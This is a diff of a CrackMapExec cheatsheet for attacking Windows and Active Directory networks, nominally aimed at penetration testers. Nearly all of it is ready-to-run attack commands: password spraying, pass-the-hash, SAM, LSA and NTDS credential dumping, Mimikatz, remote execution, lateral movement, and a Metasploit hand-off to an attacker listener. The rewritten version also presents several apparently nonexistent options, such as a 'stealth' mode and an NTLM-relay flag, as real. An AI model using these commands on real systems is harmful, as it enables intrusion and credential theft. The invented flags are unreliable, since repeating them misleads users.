@@ -1,192 +1,164 @@
-# Crack Map Exec
+## SUMMARY
+- Automates network attacks against Windows/Active Directory
+- Supports multiple protocols (SMB/WinRM/MSSQL/SSH/LDAP)
+- Enables credential attacks and lateral movement
+- Provides extensive post-exploitation capabilities
+- Integrates with BloodHound, Metasploit, and other tools
 
-## Installation
 
+
+## Primary Use Cases:
+✅ Penetration Testing
+✅ Red Team Operations
+✅ Active Directory Auditing
+✅ Network Security Assessments
+
+
+
+## Cheatsheet
 ```bash
-zombear@htb[/htb]$ sudo apt-get -y install crackmapexec
-```
+## INSTALLATION & SETUP
+# Install on Kali
+sudo apt update && sudo apt install crackmapexec
 
-## Cheat Sheet
+# Install via pipx (recommended)
+pipx install crackmapexec
 
-### General Command Format
+# Update to latest version
+pipx upgrade crackmapexec
 
-```bash
-zombear@htb[/htb]$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
-```
+# Verify installation
+crackmapexec -v
 
-### Help
-
-```bash
-
-# General help
-crackmapexec --help
-
-# Protocol help
-cracmapexec smb --help
-```
-
-### Connexions and Spraying
-
-```bash
-# Target format
-crackmapexec smb ms.evilcorp.org
-crackmapexec smb 192.168.1.0 192.168.0.2
-crackmapexec smb 192.168.1.0-28 10.0.0.1-67
+## BASIC SCANNING
+# Basic SMB scan
 crackmapexec smb 192.168.1.0/24
-crackmapexec smb targets.txt
 
-# Null session
-crackmapexec smb 192.168.10.1 -u "" up ""
+# Scan specific ports
+crackmapexec smb 192.168.1.0/24 -ports 445,139,5985
 
-# Connect to target using local account
-crackmapexec smb 192.168.215.138 -u 'Administrator' -p 'PASSWORD' --local-auth
+# Fast scan (no detailed info)
+crackmapexec smb 192.168.1.0/24 --fast
 
-# Pass the hash against a subnet
-crackmapexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth
-crackmapexec smb 172.16.157.0/24 -u administrator -H 'NTHASH'
+# Ping sweep
+crackmapexec smb 192.168.1.0/24 --ping
 
-# Bruteforcing and Password Spraying
-crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1"
-crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1" "password2"
-crackmapexec smb 192.168.100.0/24 -u "admin1" "admin2" -p "P@ssword"
-crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt
-crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt
+## CREDENTIAL ATTACKS
+# Password spray (SMB)
+crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Summer2024!' --continue-on-success
 
-```
+# Pass-the-Hash
+crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
 
-### Enumeration
+# Kerberos authentication
+crackmapexec smb 192.168.1.100 -u user -k -d domain.local
 
-```bash
+# AS-REP Roasting
+crackmapexec ldap 192.168.1.100 -u users.txt -p '' --asreproast asreproast.txt
 
-#Users
+## POST-EXPLOITATION
+# Execute commands
+crackmapexec smb 192.168.1.100 -u admin -p Password123 -x 'whoami /all'
 
-# Enumerate users
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --users
+# Dump SAM
+crackmapexec smb 192.168.1.100 -u admin -p Password123 --sam
 
-# Perform RID Bruteforce to get users
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --rid-brute
+# Dump LSASS
+crackmapexec smb 192.168.1.100 -u admin -p Password123 --lsa
 
-# Enumerate domain groups
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --groups
+# Mimikatz (sekurlsa)
+crackmapexec smb 192.168.1.100 -u admin -p Password123 -M mimikatz
 
-# Enumerate local users
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --local-users
+## LATERAL MOVEMENT
+# Create scheduled task
+crackmapexec smb 192.168.1.100 -u admin -p Password123 -X 'schtasks /create /tn "Task" /tr "cmd.exe /c calc.exe" /sc once /st 00:00'
 
-#Hosts
+# Enable RDP
+crackmapexec smb 192.168.1.100 -u admin -p Password123 -M rdp -o ACTION=enable
 
-# Generate a list of relayable hosts (SMB Signing disabled)
-crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt
+# Pass-the-Ticket
+crackmapexec smb 192.168.1.100 -u user -p pass --use-kcache
 
-# Enumerate available shares
-crackmapexec smb 192.168.215.138 -u 'user' -p 'PASSWORD' --local-auth --shares
-
-# Get the active sessions
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions
-
-# Check logged in users
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --lusers
-
-# Get the password policy
-crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol
-
-```
-
-### Command Execution
-
-```bash
-
-# CrackMapExec has 3 different command execution methods (in default order) :
-# - wmiexec --> WMI
-# - atexec --> scheduled task
-# - smbexec --> creating and running a service
-
-# Execute command through cmd.exe (admin privileges required)
-crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x 'whoami'
-
-# Force the smbexec method
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'net user Administrator /domain' --exec-method smbexec
-
-# Execute commands through PowerShell (admin privileges required)
-crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X 'whoami'
-
-```
-
-### Get Creds
-
-```bash
-
-# Dump local SAM hashes
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam
-
-# Enable or disable WDigest to get credentials from the LSA Memory
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest enable
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest disable
-
-# Then you juste have to wait the user logoff and logon again
-# But you can force the logoff
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'quser'
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'logoff <sessionid>'
-
-# Dump the NTDS.dit from DC using methods from secretsdump.py
-
-# Uses drsuapi RPC interface create a handle, trigger replication
-# and combined with additional drsuapi calls to convert the resultant
-# linked-lists into readable format
-crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
-
-# Uses the Volume Shadow copy Service
-crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
-
-# Dump the NTDS.dit password history
-smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
-
-```
-
-### Using the DB
-
-```bash
-
-# The database automatically store every hosts reaches by CME and all credentials with admin access
-cmedb
-
-# Using workspaces
-cmedb> workspace create test
-cmedb> workspace test
-
-# Access a protocol database and switch back
-cmedb (test)> proto smb
-cmedb (test)> back
-
-# List stored hosts
-cmedb> hosts
-
-# View detailed infos for a specific machine (including creds)
-cmedb> hosts <hostname>
-
-# Get stored credentials
-cmedb> creds
-
-# Get credentials access for a specific account
-cmedb> creds <username>
-
-# Using credentials from the database
-crackmapexec smb 192.168.100.1 -id <credsID>
-```
-
-### Modules
-
-```bash
-# List available modules
+## MODULE SYSTEM
+# List all modules
 crackmapexec smb -L
 
-# Module information
-crackmapexec smb -M mimikatz --module-info
+# Run specific module
+crackmapexec smb 192.168.1.100 -u admin -p Password123 -M <module>
 
-# View module options
-crackmapexec smb -M mimikatz --options
+# Popular modules:
+# - mimikatz          - netripper
+# - inveigh           - rdp
+# - spider_plus       - metasploit
+# - sharpview         - safetykatz
 
-# Mimikatz module
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz
-crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -M mimikatz
-crackmapexec smb 192.168.215.104 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'
+## PROTOCOL SUPPORT
+# SMB (primary)
+crackmapexec smb <target> [options]
+
+# WinRM
+crackmapexec winrm <target> -u user -p pass
+
+# MSSQL
+crackmapexec mssql <target> -u sa -p password --query "SELECT name FROM master..sysdatabases"
+
+# SSH
+crackmapexec ssh <target> -u root -p password -x 'id'
+
+# LDAP
+crackmapexec ldap <target> -u user -p pass --kdcHost dc.domain.local
+
+## OUTPUT & LOGGING
+# Save results to file
+crackmapexec smb 192.168.1.0/24 --output-file results.txt
+
+# JSON output
+crackmapexec smb 192.168.1.0/24 --json
+
+# Greppable output
+crackmapexec smb 192.168.1.0/24 --grep
+
+# BloodHound collection
+crackmapexec smb 192.168.1.0/24 -u user -p pass --bloodhound -c All
+
+## TUNING & OPTIMIZATION
+# Set timeout
+crackmapexec smb 192.168.1.0/24 --timeout 5
+
+# Set threads
+crackmapexec smb 192.168.1.0/24 --threads 15
+
+# Continue previous session
+crackmapexec --continue previous_session.db
+
+## DEFENSE EVASION
+# Random delay
+crackmapexec smb 192.168.1.0/24 --delay 30-90
+
+# Stealth mode
+crackmapexec smb 192.168.1.0/24 --stealth
+
+# Custom user-agent
+crackmapexec smb 192.168.1.0/24 --user-agent "Mozilla/5.0"
+
+## TROUBLESHOOTING
+# Debug mode
+crackmapexec smb 192.168.1.0/24 --debug
+
+# Show help
+crackmapexec -h
+
+# Module help
+crackmapexec smb -M <module> -o HELP=true
+
+## INTEGRATION
+# Metasploit session
+crackmapexec smb 192.168.1.100 -u admin -p pass -M metasploit -o LHOST=192.168.1.50 LPORT=4444
+
+# NTLM Relay
+crackmapexec smb --ntlm-relay <target>
+
+# Responder integration
+crackmapexec smb 192.168.1.0/24 -M inveigh -o LHOST=192.168.1.50
+
 ```
